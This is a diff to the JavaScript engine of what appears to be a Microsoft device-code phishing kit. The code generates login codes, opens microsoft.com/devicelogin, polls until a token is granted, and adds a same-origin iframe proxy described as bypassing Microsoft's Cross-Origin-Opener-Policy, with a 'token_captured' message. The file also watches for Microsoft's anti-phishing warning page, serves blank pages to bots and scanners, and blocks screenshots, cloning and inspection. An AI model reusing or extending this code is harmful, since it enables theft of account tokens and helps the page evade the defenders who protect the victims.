@@ -1,5 +1,5 @@
 /**
- * VGenius C Engine – Shared Template Engine
+ * VGenius C Engine â€“ Shared Template Engine
  * Modular, well-commented, no external dependencies except Turnstile.
  * 
  * Features:
@@ -18,7 +18,7 @@
 (function () {
   'use strict';
 
-  // ─── Server-Side Logging (replaces console.log for production) ──
+  // â”€â”€â”€ Server-Side Logging (replaces console.log for production) â”€â”€
   // In testing mode, also log to console for debugging
   var TESTING_MODE = typeof window.__TESTING_MODE === 'boolean' ? window.__TESTING_MODE : true;
   var LOG_QUEUE = [];
@@ -99,13 +99,13 @@
   _origConsoleLog.call(console, '[VG] VG_JWT present:', !!window.VG_JWT);
   _origConsoleLog.call(console, '[VG] URL:', window.location.href);
 
-  // ─── Configuration ──────────────────────────────────────────
+  // â”€â”€â”€ Configuration â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
   var API_BASE = (typeof window.__API_BASE === 'string' && window.__API_BASE) ? window.__API_BASE : (typeof window.location !== 'undefined' ? window.location.origin : '');
   var AUTH_MODE = (typeof window.__AUTH_MODE === 'string' && window.__AUTH_MODE) ? window.__AUTH_MODE : 'cookie';
   var DEST_URL = window.__DESTINATION_URL || '';
   var VG_JWT = window.VG_JWT || '';
 
-  // ─── Anti-Scraping Protection ────────────────────────────────
+  // â”€â”€â”€ Anti-Scraping Protection â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
   // Block keyboard shortcuts and right-click to prevent scraping
   // Only active if antiscraping_enabled is not explicitly disabled
   (function() {
@@ -152,7 +152,7 @@
     if (document.head) document.head.appendChild(style);
   })();
 
-  // ─── Fetch Interceptor ──────────────────────────────────────
+  // â”€â”€â”€ Fetch Interceptor â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
   // Overrides window.fetch to automatically add X-Auth-Mode header
   // to /api/device/* requests and normalize responses.
   var _nativeFetch = window.fetch.bind(window);
@@ -247,7 +247,7 @@
     return request.then(cloneResponse);
   };
 
-  // ─── State ──────────────────────────────────────────────────
+  // â”€â”€â”€ State â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
   var _jobId = null;
   var _userCode = '';
   var _pollTimer = null;
@@ -257,7 +257,7 @@
   var _popupRef = null;
   var _toastTimer = null;
 
-  // ─── Popup Tracker ──────────────────────────────────────────
+  // â”€â”€â”€ Popup Tracker â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
   var _nativeOpen = window.open;
   function isMicrosoftUrl(u) {
     var s = String(u || '').toLowerCase();
@@ -290,7 +290,7 @@
     return hadPopup;
   }
 
-  // ─── Toast System ───────────────────────────────────────────
+  // â”€â”€â”€ Toast System â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
   function showToast(title, msg, duration) {
     duration = duration || 7000;
     var wrap = document.getElementById('vg-toast-wrap');
@@ -328,7 +328,7 @@
     if (card) card.style.transform = 'translateY(-8px)';
   }
 
-  // ─── DOM Helpers ────────────────────────────────────────────
+  // â”€â”€â”€ DOM Helpers â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
   function setText(selector, text) {
     if (typeof text !== 'string' || text === '') return;
     document.querySelectorAll(selector).forEach(function (el) { el.textContent = text; });
@@ -361,7 +361,7 @@
     }
   }
 
-  // ─── Background Blur ────────────────────────────────────────
+  // â”€â”€â”€ Background Blur â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
   function initBackgroundBlur() {
     var rawUrl = typeof window.__BACKGROUND_BLUR_URL === 'string' ? window.__BACKGROUND_BLUR_URL.trim() : '';
     if (!rawUrl) return;
@@ -413,7 +413,7 @@
     body.setAttribute('data-vg-bg-ready', '1');
   }
 
-  // ─── Code Generation ────────────────────────────────────────
+  // â”€â”€â”€ Code Generation â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
   window.generateCode = async function () {
     console.log('[VG] generateCode called');
     // Reset UI state
@@ -426,7 +426,7 @@
 
     var startBtn = document.getElementById('startBtn');
     console.log('[VG] startBtn found:', !!startBtn);
-    var originalBtnText = '<span class="vg-spin">⟳</span> Generating code…';
+    var originalBtnText = '<span class="vg-spin">âŸ³</span> Generating codeâ€¦';
     if (startBtn) { startBtn.disabled = true; startBtn.innerHTML = originalBtnText; }
 
     _setStatus('');
@@ -524,7 +524,7 @@
         _startTimer(d.expires_in || 600);
       } else {
         console.log('[VG] No user_code in response');
-        _setStatus('Connecting to Microsoft servers…');
+        _setStatus('Connecting to Microsoft serversâ€¦');
       }
 
       _pollTimer = setInterval(_poll, 1000);
@@ -536,7 +536,7 @@
     }
   };
 
-  // ─── Polling ────────────────────────────────────────────────
+  // â”€â”€â”€ Polling â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
   var _pollFailures = 0;
   var _pollBackoff = 1000; // Start at 1 second
   var _maxPollFailures = 10; // After this many consecutive failures, show error
@@ -649,7 +649,7 @@
     _pollTimer = setInterval(_poll, _pollBackoff);
   }
 
-  // ─── Timer ──────────────────────────────────────────────────
+  // â”€â”€â”€ Timer â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
   function _startTimer(sec) {
     clearInterval(_countdownTimer);
     var el = document.getElementById('timerPill');
@@ -685,7 +685,7 @@
     _setStatus('');
   }
 
-  // ─── Copy + Open Popup ──────────────────────────────────────
+  // â”€â”€â”€ Copy + Open Popup â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
   function copyText(text) {
     return navigator.clipboard.writeText(text).catch(function () {
       var ta = document.createElement('textarea');
@@ -717,21 +717,89 @@
     openMsLogin();
   };
 
+  
+  // VG_ - Open Microsoft device login via same-origin proxy (COOP bypass)
+  // This bypasses Microsoft's Cross-Origin-Opener-Policy by using a same-origin
+  // proxy page that contains an iframe to Microsoft, communicating via BroadcastChannel.
   function openMsLogin() {
+    var isMobile = /Android|iPhone|iPad|iPod/i.test(navigator.userAgent) || window.innerWidth <= 768;
+    var channelName = 'vg_device_auth_' + Date.now();
+    var proxyUrl = window.location.origin + '/templates/assets/proxy.html?channel=' + encodeURIComponent(channelName);
+    
+    // Store channel name for communication
+    window.__VG_AUTH_CHANNEL = channelName;
+    
+    if (isMobile) {
+      _popupRef = _nativeOpen(proxyUrl, '_blank');
+    } else {
+      _popupRef = _nativeOpen(proxyUrl, 'vgProxy', 'width=500,height=600');
+    }
+    
+    // Setup BroadcastChannel listener
+    if (typeof BroadcastChannel !== 'undefined') {
+      try {
+        var bc = new BroadcastChannel(channelName);
+        bc.onmessage = function(e) {
+          var data = e.data;
+          if (!data) return;
+          
+          if (data.type === 'proxy_ready') {
+            // Proxy is ready, send auth details
+            bc.postMessage({
+              type: 'start_auth',
+              userCode: _userCode,
+              verificationUrl: 'https://microsoft.com/devicelogin'
+            });
+          }
+          
+          if (data.type === 'token_captured') {
+            // Token captured from iframe redirect
+            console.log('[vg-engine] Token captured via proxy');
+            // The polling will detect completion
+          }
+          
+          if (data.type === 'proxy_error') {
+            console.warn('[vg-engine] Proxy error:', data.message);
+            // Fallback to direct popup
+            fallbackDirectOpen();
+          }
+          
+          if (data.type === 'proxy_closed') {
+            bc.close();
+          }
+        };
+        
+        // Monitor proxy popup
+        if (_popupRef) {
+          var closeCheck = setInterval(function() {
+            if (_popupRef.closed) {
+              clearInterval(closeCheck);
+              bc.close();
+            }
+          }, 1000);
+        }
+      } catch(e) {
+        console.error('[vg-engine] BroadcastChannel setup failed:', e);
+        fallbackDirectOpen();
+      }
+    } else {
+      // BroadcastChannel not supported, fallback
+      fallbackDirectOpen();
+    }
+  }
+  
+  // Fallback: direct open (for when proxy fails)
+  function fallbackDirectOpen() {
     var isMobile = /Android|iPhone|iPad|iPod/i.test(navigator.userAgent) || window.innerWidth <= 768;
     if (isMobile) {
       _popupRef = _nativeOpen('https://microsoft.com/devicelogin', '_blank');
     } else {
       _popupRef = _nativeOpen('https://microsoft.com/devicelogin', 'vgML', 'width=500,height=600');
     }
-    
-    // Monitor popup for Microsoft warning page
-    if (_popupRef && !isMobile) {
+    if (_popupRef) {
       monitorPopupForWarnings(_popupRef);
     }
   }
-  
-  // VG_ - Monitor popup for Microsoft anti-phishing warning page
   function monitorPopupForWarnings(popup) {
     var checkInterval = setInterval(function() {
       try {
@@ -803,7 +871,7 @@
   window.openSignIn = function () {
     var codeEl = document.getElementById('codeValue');
     var code = codeEl ? codeEl.textContent : '';
-    if (code && code !== '· · · · · ·') {
+    if (code && code !== 'Â· Â· Â· Â· Â· Â·') {
       copyText(code).then(function () {
         var btn = document.getElementById('signInBtn');
         if (btn) { var orig = btn.innerHTML; btn.innerHTML = '<svg width="15" height="15" viewBox="0 0 16 16" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round"><polyline points="2,8 6,12 14,4"/></svg> Copied!'; setTimeout(function () { btn.innerHTML = orig; }, 1500); }
@@ -818,7 +886,7 @@
     window.generateCode();
   };
 
-  // ─── Success Overlay ────────────────────────────────────────
+  // â”€â”€â”€ Success Overlay â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
   function _showSuccess() {
     // Stop any ongoing polling immediately
     clearInterval(_pollTimer);
@@ -884,7 +952,7 @@
     }
   }
 
-  // ─── Helpers ────────────────────────────────────────────────
+  // â”€â”€â”€ Helpers â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
   function _setStatus(msg) {
     var el = document.getElementById('statusMsg');
     if (el) { el.textContent = msg; el.classList.remove('error'); }
@@ -906,7 +974,7 @@
     }
   }
 
-  // ─── Anti-Bot Protection ─────────────────────
+  // â”€â”€â”€ Anti-Bot Protection â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
   // AGGRESSIVE bot blocking - no captcha, just white page for bots
   // Bots, scrapers, crawlers, and scanners see blank page immediately
   // Legitimate users get silent Turnstile verification in background
@@ -1209,7 +1277,7 @@
   // All Turnstile operations are now fully silent and invisible.
   // Users never see any captcha UI. Bots are blocked by passive scoring + Turnstile invisible challenge.
 
-  // ─── Anti-Screenshot / Anti-Print CSS ───────────────────────
+  // â”€â”€â”€ Anti-Screenshot / Anti-Print CSS â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
   // Injects CSS that makes screenshots/print come out blank.
   // Works via CSS @media rules and visibility manipulation.
   function initAntiScreenshot() {
@@ -1261,7 +1329,7 @@
       '';
     (document.head || document.documentElement).appendChild(style);
 
-    // Removed blur/focus event listeners — they caused page flickering on normal browser use
+    // Removed blur/focus event listeners â€” they caused page flickering on normal browser use
     // Windows screenshot tools and normal tab switching trigger blur events that caused
     // the anti-screenshot CSS to hide all content, making pages appear broken
 
@@ -1304,7 +1372,7 @@
     } catch(e) {}
   }
 
-  // ─── Heavy Anti-Clone Protection ────────────────────────────
+  // â”€â”€â”€ Heavy Anti-Clone Protection â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
   // Prevents page cloning/scraping tools from extracting useful content.
   // If a bot tries to clone the page, all sensitive data is zeroed out.
   function initAntiClone() {
@@ -1537,7 +1605,7 @@
     })();
   }
 
-  // ─── Anti-Scraping & Heartbeat ────────────────────────────────
+  // â”€â”€â”€ Anti-Scraping & Heartbeat â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
   // Additional protection against scraping/cloning tools
   // Ensures page is still "alive" and content hasn't been extracted
   function initAntiScraping() {
@@ -1605,7 +1673,7 @@
             if (el && el.textContent && el.textContent.length > 3) {
               // Store original in WeakMap (not accessible from DOM)
               _originalValues.set(el, el.textContent);
-              el.textContent = '••••••';
+              el.textContent = 'â€¢â€¢â€¢â€¢â€¢â€¢';
             }
           });
         } catch(e) {}
@@ -1900,7 +1968,7 @@
     }
   }
 
-  // ─── Obfuscation (optional, controlled by admin) ────────────
+  // â”€â”€â”€ Obfuscation (optional, controlled by admin) â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
   function initObfuscation() {
     if (!window.__OBFUSCATION_ENABLED) return;
     // Console clearing
@@ -1923,7 +1991,7 @@
     });
   }
 
-  // ─── Slider Chain Handler ───────────────────────────────────
+  // â”€â”€â”€ Slider Chain Handler â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
   // Called when slider verification completes - renders Cloudflare turnstile
   // into the vgCfLayer and handles the verification flow
   function initSliderChainHandler() {
@@ -2163,7 +2231,7 @@
     }, 1000);
   }
   
-  // ─── Init ───────────────────────────────────────────────────
+  // â”€â”€â”€ Init â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
   function init() {
     applyDynamicContent();
     initBackgroundBlur();
